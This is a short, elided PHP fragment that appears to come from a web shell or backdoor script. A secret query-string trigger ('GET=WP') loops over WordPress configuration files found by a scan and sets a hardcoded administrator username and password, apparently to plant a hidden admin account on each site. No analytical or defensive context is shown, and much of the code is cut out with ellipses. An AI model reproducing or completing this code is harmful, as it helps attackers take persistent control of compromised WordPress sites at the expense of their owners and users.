...
if (isset($_GET['GET']) && $_GET['GET'] === 'WP') {
    ...
    foreach ($scan_result['wp_configs_found'] as $index => $config) { 
        ...
        $username = 'adminbiskuat';
        $password = 'kamupakainanya';
